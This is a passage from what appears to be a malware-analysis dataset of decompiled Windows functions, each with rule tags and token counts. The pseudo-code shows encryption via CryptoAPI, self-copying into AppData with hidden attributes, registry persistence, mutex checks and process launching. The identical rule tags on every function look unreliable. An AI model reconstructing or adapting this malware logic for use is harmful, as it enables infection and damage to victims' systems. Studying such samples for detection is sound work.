(*ppiVar1)[2], **ppiVar1 << 2);\n            uVar5 = uVar5 + **ppiVar1 * 4;\n            fcn.0040af12();\n            fcn.0040af12();\n            arg_14h = arg_14h + 1;\n        } while (arg_14h < hObject);\n    }\n    fcn.0040af12();\n    cVar3 = fcn.004089f8(arg_8h);\n    if (cVar3 != '\\0') {\n        uVar5 = 0;\n        uVar6 = fcn.0040acd8(0x41813c, 9, 0xd9feae45, 0x40000000, 1, 0, 2, 0, 0);\n        hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (hObject != 0xffffffff) {\n            if (*puVar4 != 0) {\n                do {\n                    iVar7 = *(puVar4[2] + uVar5 * 4);\n                    (*pcVar2)(hObject, *(iVar7 + 8), *(iVar7 + 0xc) * 2, &arg_8h, 0);\n                    uVar10 = 0;\n                    puVar8 = &arg_8h;\n                    uVar9 = 4;\n                    uVar6 = fcn.0040a88f(0x418148, 4, 0xdbf6d357, 0);\n                    (*pcVar2)(hObject, uVar6, uVar9, puVar8, uVar10);\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < *puVar4);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    if (*0x41c696 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n        fcn.004034ad();\n        (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n        iVar7 = 1;\n        if (*0x41c694 != '\\0') {\n            (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n            iVar7 = var_18h * 2;\n        }\n        fcn.00403532();\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.0040da9e(fcn.00403a84, &var_58h);\n        }\n        fcn.0040daeb();\n        fcn.004034f1();\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n        fcn.0040db26();\n    }\n    return;\n}\n",
        "token_count": 1040
    },
    "004040a5": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004040a5(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t arg_ch;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    int64_t iVar6;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x41c674);\n    uVar2 = fcn.0040a88f(0x418170, 7, 0x7fd53f7d, 0);\n    iVar3 = fcn.00415506(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = fcn.0040a88f(0x418170, 7, 0x7fd53f7d, 0);\n        fcn.00415506(uVar2);\n        iVar6 = fcn.004155c2();\n        *0x41c696 = iVar6 != 0;\n        uVar2 = fcn.0040a88f(0x418178, 0xb, 0xed216dd6, 0);\n        fcn.00415506(uVar2);\n        iVar6 = fcn.004155c2();\n        *0x41c694 = iVar6 != 0;\n        uVar2 = fcn.0040a88f(0x418184, 0xe, 0xab913f46, 0);\n        fcn.00415506(uVar2);\n        iVar3 = fcn.004155c2();\n        if (iVar3 == 0) {\n            iVar3 = 0x10;\n        }\n        *0x41c6bc = iVar3 << 0x14;\n        uVar2 = fcn.0040a88f(0x418194, 10, 0xf7ebe9a3, 0);\n        fcn.00415506(uVar2);\n        *0x41c695 = fcn.004155c2();\n        if (*0x41c695 == 0) {\n            *0x41c695 = 1;\n        }\n        uVar2 = fcn.0040a88f(0x4181a0, 0xd, 0xb1baaeeb, 0);\n        fcn.00415506(uVar2);\n        *0x41c6a0 = fcn.004155c2();\n        *0x41c6c4 = *0x41c6bc / *0x41c695;\n        uVar2 = fcn.0040a88f(0x4181b0, 0xc, 0x6374f5f8, 0);\n        fcn.00415506(uVar2);\n        *0x41c6c8 = fcn.004155c2();\n        if (*0x41c6c8 < 0x240) {\n            *0x41c6c8 = 0x240;\n        }\n        for (; (*0x41c6c8 & 7) != 0; *0x41c6c8 = *0x41c6c8 + 1) {\n        }\n        uVar2 = fcn.0040a88f(0x4181c0, 0xc, 0x83fd2b63, 0);\n        fcn.00415506(uVar2);\n        *0x41c6b0 = fcn.004155c2();\n        *0x41c6b0 = *0x41c6b0 >> 3;\n    }\n    fcn.00403411(arg_8h);\n    cVar1 = fcn.00403ea6();\n    if (cVar1 == '\\0') {\n        iVar3 = fcn.0040462d(arg_8h);\n        if (iVar3 != 0) {\n            fcn.0040df2e(&var_ch);\n            arg_ch = fcn.0040ae05(0);\n            if (arg_ch != 0) {\n                *0x41c698 = fcn.0040e3cb(var_ch, arg_ch);\n                if (*0x41c698 != 0) {\n                    var_1h._0_1_ = '\\0';\n                    iVar4 = fcn.004044aa(iVar3, arg_ch);\n                    if (iVar4 != 0) {\n                        iVar4 = fcn.0040f0e7(iVar4, &var_8h);\n                        if (iVar4 != 0) {\n                            fcn.0040ee5a(iVar4, var_8h, 0x41c6d0);\n                            uVar2 = fcn.0040acd8(0x418160, 0xc, 0xaa34ef4f, extraout_ECX, iVar4);\n                            var_1h._0_1_ = fcn.0040405f(uVar2);\n                            fcn.0040af58();\n                        }\n                        fcn.0040af58();\n                        if (var_1h != '\\0') {\n                            iVar4 = arg_ch;\n                            iVar5 = fcn.0040e3cb(*0x41c6ac, arg_ch);\n                            if (iVar5 != 0) {\n                                uVar2 = fcn.0040acd8(str.zfeY, 0xc, 0x15623934, iVar4, arg_ch);\n                                fcn.0040405f(uVar2);\n                            }\n                        }\n                    }\n                }\n                fcn.0040af58();\n            }\n            fcn.0040e375();\n            fcn.0040e375();\n            (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(iVar3);\n        }\n        fcn.00403ea6();\n    }\n    *0x41c6a4 = *0x41c6a0 >> 0x20;\n    uVar2 = 0;\n    if ((*0x41c6ac != 0) && (*0x41c6b4 != 0)) {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 1407
    },
    "004044aa": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004044aa(uint arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    uint32_t arg_18h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t n;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t s2;\n    int32_t s1;\n    uint var_1h;\n    \n    uVar3 = *0x41c698;\n    arg_18h = fcn.004043aa(arg_8h);\n    uVar6 = arg_18h - 0xb;\n    uVar7 = uVar3 % uVar6;\n    iVar8 = (uVar7 != 0) + uVar3 / uVar6;\n    var_14h = fcn.0040ae05(0);\n    uVar3 = *0x41c698;\n    if ((var_14h != 0) && (s1 = fcn.0040ae05(0),  uVar3 = *0x41c698,  s1 != 0)) {\n        n = 0;\n        var_10h = var_14h;\n        var_1h._0_1_ = '\\x01';\n        s2 = arg_ch;\n        if (iVar8 != 1) {\n            do {\n                var_20h = uVar6;\n                sub.ntdll.dll_memcpy(s1, s2, uVar6);\n                iVar2 = fcn.00404444(arg_8h, 0, s1, &var_20h, arg_18h);\n                if (iVar2 == 0) goto code_r0x004045dc;\n                uVar3 = 0;\n                if (arg_18h != 0) {\n                    var_18h = (arg_18h - 1) + s1;\n                    do {\n                        uVar1 = *var_18h;\n                        var_18h = var_18h + -1;\n                        *(uVar3 + var_10h) = uVar1;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 < arg_18h);\n                }\n                var_10h = var_10h + var_20h;\n                s2 = s2 + uVar6;\n                n = n + 1;\n            } while (n < iVar8 - 1U);\n        }\n        n = uVar7;\n        if (uVar7 == 0) {\n            n = uVar6;\n        }\n        sub.ntdll.dll_memcpy(s1, s2, n);\n        iVar2 = s1;\n        iVar4 = fcn.00404444(arg_8h, 1, s1, &n, arg_18h);\n        if (iVar4 == 0) {\n            var_1h._0_1_ = '\\0';\n        }\n        uVar6 = 0;\n        if (arg_18h != 0) {\n            puVar5 = (arg_18h - 1) + iVar2;\n            do {\n                uVar1 = *puVar5;\n                puVar5 = puVar5 + -1;\n                *(uVar6 + var_10h) = uVar1;\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < arg_18h);\n        }\n        uVar3 = iVar8 * arg_18h;\n        if (var_1h == '\\0') {\ncode_r0x004045dc:\n            fcn.0040af12();\n            fcn.0040af12();\n            var_14h = 0;\n            uVar3 = *0x41c698;\n        }\n    }\n    *0x41c698 = uVar3;\n    return var_14h;\n}\n",
        "token_count": 939
    },
    "00404602": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00404602(void)\n\n{\n    if (*0x41c6e0 == 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(0x41c6e0, 0, 0, 1, 0xf0000000);\n    }\n    return *0x41c6e0 != 0;\n}\n",
        "token_count": 84
    },
    "00404c76": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c76(int32_t arg_8h)\n\n{\n    uint32_t var_cch;\n    uint *var_c8h;\n    uint32_t var_c4h;\n    uint *var_c0h;\n    uint32_t var_bch;\n    uint *var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_98h;\n    code **var_4ch;\n    uint var_48h;\n    \n    var_ach = arg_8h + *(arg_8h + 0x3c);\n    var_b0h = (*(var_ach + 6) - 1) * 0x28 + *(var_ach + 0x14) + 0x18 + var_ach;\n    var_4ch = arg_8h + *(var_b0h + 0xc);\n    if (*var_4ch != NULL) {\n        (**var_4ch)(&var_b4h);\n    }\n    var_b8h = &var_a8h;\n    for (var_bch = 0; var_bch < 0x10; var_bch = var_bch + 1) {\n        *var_b8h = 0;\n        var_b8h = var_b8h + 1;\n    }\n    var_c0h = &var_48h;\n    for (var_c4h = 0; var_c4h < 0x44; var_c4h = var_c4h + 1) {\n        *var_c0h = 0;\n        var_c0h = var_c0h + 1;\n    }\n    var_48h = 0x44;\n    (*var_4ch[2])(0, var_4ch + 0x86, 0, 0, 0, 0x9000008, 0, 0, &var_48h, &var_a8h);\n    (*var_4ch[2])(0, var_4ch + 199, 0, 0, 0, 0x9000008, 0, 0, &var_48h, &var_a8h);\n    if (*(var_4ch + 0x108) != '\\0') {\n        (*var_4ch[2])(0, var_4ch + 0x108, 0, 0, 0, 0x9000008, 0, 0, &var_48h, &var_a8h);\n        (*var_4ch[2])(0, var_4ch + 0x149, 0, 0, 0, 0x9000008, 0, 0, &var_48h, &var_a8h);\n    }\n    var_c8h = &var_98h;\n    for (var_cch = 0; var_cch < 0x44; var_cch = var_cch + 1) {\n        *var_c8h = 0;\n        var_c8h = var_c8h + 1;\n    }\n    var_98h = 0x44;\n    (*var_4ch[1])(var_4ch + 4, 0, 0, 0, 0, 0x9000008, 0, 0, &var_98h, &var_a8h);\n    (*var_4ch[3])(0);\n    return 1;\n}\n",
        "token_count": 778
    },
    "004050b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050b4(int32_t *arg_8h)\n\n{\n    int32_t *arg_10h;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_40h;\n    uint var_3ch;\n    int32_t *var_30h;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    piVar1 = arg_8h;\n    var_4h = (*arg_8h[0x51])(0x1f0003, 0, arg_8h);\n    if (var_4h != 0) {\n        (*piVar1[0x4b])(0, 2);\n        iVar2 = (*piVar1[0x4c])(piVar1 + 0x54, 0, 0x17, piVar1 + 0x58, &arg_8h);\n        if ((-1 < iVar2) && (arg_8h != NULL)) {\n            iVar2 = (**(*arg_8h + 0x14))(arg_8h, 0x10840614);\n            if (-1 < iVar2) {\n                fcn.00404eb6(piVar1 + 0x60, piVar1 + 0xe2);\n                arg_10h = piVar1 + 0xec;\n                fcn.00404f8a(arg_8h, piVar1 + 0x1f0, arg_10h);\n                fcn.0040501e(arg_8h, piVar1 + 0x376, arg_10h, piVar1 + 0x16e);\n                iVar2 = 0x3c;\n                puVar3 = &var_40h;\n                do {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n                var_24h = 0;\n                var_30h = piVar1 + 0x2f4;\n                var_40h = 0x3c;\n                var_3ch = 0xc440;\n                var_28h = arg_10h;\n                iVar2 = (*piVar1[0x4e])(&var_40h);\n                if ((iVar2 != 0) && (var_8h != 0)) {\n                    (*piVar1[0x4f])(var_8h, 0xffffffff);\n                    (*piVar1[0x52])(var_8h);\n                    (*piVar1[0x50])(var_4h);\n                }\n                fcn.00404f23(arg_10h);\n            }\n            (**(*arg_8h + 8))(arg_8h);\n        }\n        (*piVar1[0x52])(var_4h);\n    }\n    (*piVar1[0x53])(0);\n    return;\n}\n",
        "token_count": 675
    },
    "00405ff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ff0(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint var_2d0h;\n    uint var_c8h;\n    \n    if (*0x41e1e8 == 0) {\n        puVar4 = &var_c8h;\n        uVar2 = fcn.0040acd8(0x418534, 0x11, 0x51131b9f, param_1);\n        fcn.0040c52a(uVar2, puVar4);\n        cVar1 = fcn.0040f871(&var_2d0h, 0x208);\n        if (cVar1 != '\\0') {\n            (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1a, 0, 0, &var_2d0h);\n        }\n        puVar4 = &var_2d0h;\n        uVar2 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, puVar4, &var_c8h);\n        fcn.0040be75(0x41e1e8, uVar2, puVar4);\n        fcn.0040f36c(0x41e1e8);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(0x41e1e8);\n        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(0x41e1e8, uVar3 | 6);\n    }\n    return 0x41e1e8;\n}\n",
        "token_count": 381
    },
    "004060a5": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004060a5(uint arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    uint var_678h;\n    uint var_470h;\n    uint lpBuffer;\n    uint var_60h;\n    uint s;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint32_t lpApplicationName;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    uVar3 = fcn.00405ff0();\n    uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar3);\n    uVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(0x41dc10, uVar3, uVar4);\n    if (uVar5 != 0) {\n        cVar2 = fcn.00405f8e(uVar3);\n        if (cVar2 != '\\0') {\n            fcn.00408d9a();\n            var_1h._0_1_ = 0;\n        }\n        fcn.00405d2f(&var_678h);\n        pcVar1 = _sym.imp.SHLWAPI.dll_PathFindFileNameW;\n        uVar6 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(&var_678h);\n        uVar4 = uVar3;\n        uVar6 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, uVar3, uVar6);\n        uVar5 = fcn.0040beef(uVar6, uVar4);\n        if (uVar5 != 0) {\n            fcn.0040f448(lpApplicationName);\n            (*_sym.imp.KERNEL32.dll_CopyFileW)(0x41dc10, lpApplicationName, 0);\n            uVar4 = fcn.0040acd8(0x4180e8, 0xc, 0x524f9883, &var_470h, 0x104);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar4);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(uVar4);\n            fcn.0040f55e(&var_470h, lpApplicationName);\n            fcn.0040f55e(&var_470h, uVar3);\n            if (arg_8h == '\\0') {\n                *arg_ch = lpApplicationName;\n            }\n            else {\n                iVar7 = fcn.0040c762();\n                if ((iVar7 != 0) && (cVar2 = fcn.00408ec8(),  cVar2 != '\\0')) {\n                    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpBuffer, 0x104);\n                    uVar3 = (*pcVar1)(lpApplicationName);\n                    uVar4 = fcn.0040acd8(0x418548, 3, 0x76b94724, extraout_ECX);\n                    fcn.0040c014(&lpBuffer, 0, uVar4, uVar3);\n                    uVar3 = fcn.0040cc7b(&lpBuffer, 6);\n                    uVar4 = fcn.0040cc7b(&lpBuffer, 3);\n                    fcn.00407168(lpApplicationName, uVar4, uVar3);\n                }\n                sub.ntdll.dll_memset(&s, 0, 0x40);\n                var_18h = 0;\n                var_14h = 0;\n                uStack20 = 0;\n                uStack16 = 0;\n                var_60h = 0x44;\n                iVar7 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                                  (lpApplicationName, 0, 0, 0, 0, 0x1000000, 0, 0, &var_60h, &var_18h);\n                if (iVar7 != 0) {\n                    fcn.0040c13c();\n                    fcn.0040c13c();\n                }\n                fcn.0040af12();\n                lpApplicationName = fcn.00408d9a();\n            }\n            var_1h._0_1_ = 0;\n            uVar5 = lpApplicationName;\n        }\n    }\n    return uVar5 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1070
    },
    "00406482": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406482(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint uVar6;\n    uint *lpData;\n    uint *puVar7;\n    uint uVar8;\n    uint lpBuffer;\n    uint var_198h;\n    uint32_t var_194h;\n    uint lpOutputString;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00408a6d();\n    cVar2 = fcn.00408ce7();\n    if (cVar2 != '\\0') {\n        var_198h = 0;\n        sub.ntdll.dll_memset(&var_194h, 0, 0x118);\n        fcn.0040f255();\n        if (9 < var_194h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n        fcn.00407bcd(arg_8h, 0xffffffff);\n    }\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00408ce7();\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.00409aaf();\n            fcn.00407bcd(arg_8h, uVar3);\n        }\n        cVar1 = fcn.004089f8(arg_8h);\n        if (cVar1 != '\\0') {\n            fcn.0040a88f(0x41854c, 0xf, 0x70b42d7c, 0);\n            uVar3 = fcn.004089f2();\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpOutputString, extraout_ECX, uVar3);\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&lpOutputString);\n        }\n        fcn.00408d9a();\n        goto code_r0x00406805;\n    }\n    puVar7 = arg_8h;\n    cVar1 = fcn.0040154c(arg_8h);\n    if (cVar1 != '\\0') goto code_r0x00406805;\n    uVar8 = 4;\n    lpData = &var_4h;\n    uVar6 = 4;\n    var_4h = 2;\n    uVar3 = fcn.0040acd8(0x41855c, 6, 0x13dc1e75, puVar7);\n    uVar4 = fcn.0040acd8(0x418564, 0x3b, 0xcb618e7e);\n    fcn.0040a731(0x80000001, uVar4, uVar3, uVar6, lpData, uVar8);\n    uVar8 = 4;\n    puVar7 = &var_4h;\n    uVar6 = 4;\n    var_4h = 1;\n    uVar3 = fcn.0040acd8(0x4185a0, 0xb, 0xc796785e, extraout_ECX_00);\n    uVar4 = fcn.0040acd8(0x418564, 0x3b, 0xcb618e7e);\n    fcn.0040a731(0x80000001, uVar4, uVar3, uVar6, puVar7, uVar8);\n    var_4h = 0;\n    uVar8 = 4;\n    puVar7 = &var_4h;\n    uVar6 = 4;\n    uVar3 = fcn.0040acd8(0x4185ac, 0xf, 0x5ac72b1e, extraout_ECX_01);\n    uVar4 = fcn.0040acd8(0x418564, 0x3b, 0xcb618e7e);\n    fcn.0040a731(0x80000001, uVar4, uVar3, uVar6, puVar7, uVar8);\n    if (arg_ch != '\\0') {\n        uVar3 = fcn.0040acd8(0x4185bc, 0x10, 0x21e0c270);\n        fcn.0040c5a3(uVar3);\n    }\n    cVar1 = fcn.004060a5(1, 0);\n    if (cVar1 == '\\0') goto code_r0x00406805;\n    (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, 0x41daf0);\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar5 == 0xb7) goto code_r0x00406805;\n    iVar5 = fcn.0040bb38();\n    if (iVar5 == 0) {\n        if (arg_ch != '\\0') goto code_r0x00406692;\n    }\n    else if (arg_ch == '\\0') {\n        cVar1 = fcn.00406b5e();\n        if (cVar1 != '\\0') goto code_r0x00406805;\n        fcn.00409195();\n    }\n    else {\ncode_r0x00406692:\n        fcn.00408f0a();\n    }\n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(0x41d8e8);\n    fcn.0040c63e();\n    fcn.0040f448(0x41dc10);\n    iVar5 = fcn.0040c762();\n    if (iVar5 != 0) {\n        cVar1 = fcn.00408ec8();\n        if (cVar1 != '\\0') {\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpBuffer, 0x104);\n            uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(0x41dc10);\n            uVar4 = fcn.0040acd8(0x418548, 3, 0x76b94724, extraout_ECX_02);\n            fcn.0040c014(&lpBuffer, 0, uVar4, uVar3);\n            uVar3 = fcn.0040cc7b(&lpBuffer, 6);\n            uVar4 = fcn.0040cc7b(&lpBuffer, 3);\n            fcn.00407168(0x41dc10, uVar4, uVar3);\n        }\n    }\n    cVar1 = fcn.00409b70(arg_8h);\n    if (cVar1 != '\\0') {\n        var_8h = fcn.0040a5cd(&var_ch, &var_10h);\n        if (var_8h != 0) {\n            cVar1 = fcn.00408ce7();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00409aaf();\n                fcn.00407bcd(arg_8h, uVar3);\n            }\n            while( true ) {\n                cVar1 = fcn.004089b9();\n                if (cVar1 != '\\0') break;\n                (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n            }\n            fcn.00403c08(arg_8h, var_ch, var_8h, var_10h);\n            fcn.0040642d(arg_8h);\n            cVar1 = fcn.004089f8(arg_8h);\n            if (cVar1 == '\\0') {\n                (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, &lpBuffer);\n                arg_8h = &lpBuffer;\n                fcn.0040974e(arg_8h);\n            }\n            uVar8 = 4;\n            puVar7 = &var_4h;\n            uVar6 = 4;\n            var_4h = 1;\n            uVar3 = fcn.0040acd8(0x4185d0, 0xc, 0x8788d0d4, arg_8h);\n            uVar4 = fcn.0040a605();\n            fcn.0040a731(0x80000001, uVar4, uVar3, uVar6, puVar7, uVar8);\n            *0x41e3f1 = 1;\n        }\n    }\ncode_r0x00406805:\n    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41d8e0);\n    return;\n}\n",
        "token_count": 1967
    },
    "00406a3e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406a3e(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint var_68h;\n    uint var_55h;\n    \n    if (*0x41e3f4 == 0) {\n        puVar1 = fcn.00403dc7();\n        uVar2 = fcn.004084db();\n        fcn.004069b4(uVar2);\n        uVar2 = fcn.0040a88f(0x418604, 0x20, 0x5b6e31f0, 0);\n        fcn.0040beb2(&var_68h, uVar2, *puVar1);\n        uVar2 = fcn.0040a88f(str.JDB, 0x2c, 0x3d896649, 0);\n        fcn.0040bf4f(uVar2, var_68h);\n    }\n    return *0x41e3f4;\n}\n",
        "token_count": 234
    },
    "00406ddf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406ddf(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    piVar5 = arg_8h;\n    var_4h = NULL;\n    iVar3 = (**(*arg_8h + 0x1c))(arg_8h, &var_4h);\n    pcVar2 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n    pcVar1 = _sym.imp.OLEAUT32.dll_SysStringLen;\n    if ((-1 < iVar3) && (var_4h != NULL)) {\n        uVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(arg_ch);\n        (**(*var_4h + 0x28))(var_4h, uVar4);\n        (*pcVar1)(uVar4);\n        uVar4 = (*pcVar2)(arg_10h);\n        (**(*var_4h + 0x20))(var_4h, uVar4);\n        (*pcVar1)(uVar4);\n        (**(*var_4h + 8))(var_4h);\n        piVar5 = arg_8h;\n    }\n    var_10h = NULL;\n    iVar3 = (**(*piVar5 + 0x24))(piVar5, &var_10h);\n    if ((-1 < iVar3) && (var_10h != NULL)) {\n        var_ch = NULL;\n        iVar3 = (**(*var_10h + 0x28))(var_10h, 1, &var_ch);\n        if ((-1 < iVar3) && (var_ch != NULL)) {\n            arg_8h = NULL;\n            iVar3 = (***var_ch)(var_ch, 0x4175f8, &arg_8h);\n            if ((-1 < iVar3) && (arg_8h != NULL)) {\n                uVar4 = fcn.0040acd8(0x41865c, 0x13, 0x9c50348f);\n                iVar3 = (*pcVar2)(uVar4);\n                if (iVar3 != 0) {\n                    (**(*arg_8h + 0x3c))(arg_8h, iVar3);\n                    (*pcVar1)(iVar3);\n                }\n                var_8h = NULL;\n                iVar3 = (**(*arg_8h + 0x28))(arg_8h, &var_8h);\n                if ((-1 < iVar3) && (var_8h != NULL)) {\n                    uVar4 = fcn.0040acd8(0x418670, 4, 0x55797f1a);\n                    iVar3 = (*pcVar2)(uVar4);\n                    if (iVar3 != 0) {\n                        (**(*var_8h + 0x20))(var_8h, iVar3);\n                        (*pcVar1)(iVar3);\n                    }\n                    (**(*var_8h + 8))(var_8h);\n                }\n                (**(*arg_8h + 8))(arg_8h);\n            }\n            (**(*var_ch + 8))(var_ch);\n        }\n        (**(*var_10h + 8))(var_10h);\n    }\n    return 1;\n}\n",
        "token_count": 795
    },
    "00407bcd": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
